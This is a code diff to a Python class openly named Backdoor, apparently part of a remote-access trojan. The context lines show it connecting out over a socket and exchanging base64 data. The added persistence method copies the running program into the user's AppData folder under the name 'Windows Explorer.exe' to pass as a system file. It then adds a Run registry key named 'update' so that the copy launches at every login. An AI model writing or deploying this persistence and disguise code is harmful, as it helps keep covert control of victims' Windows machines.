@@ -13,6 +13,13 @@ class Backdoor():
         self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def persistence(self):
+        location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
+
     def cmd_send(self, data):
     	"""
     	Send data in base64 format
@@ -25,6 +32,7 @@ class Backdoor():
     	"""
     	recive data in base64 format
     	"""
+
         json_recived = ""
 
         while True:
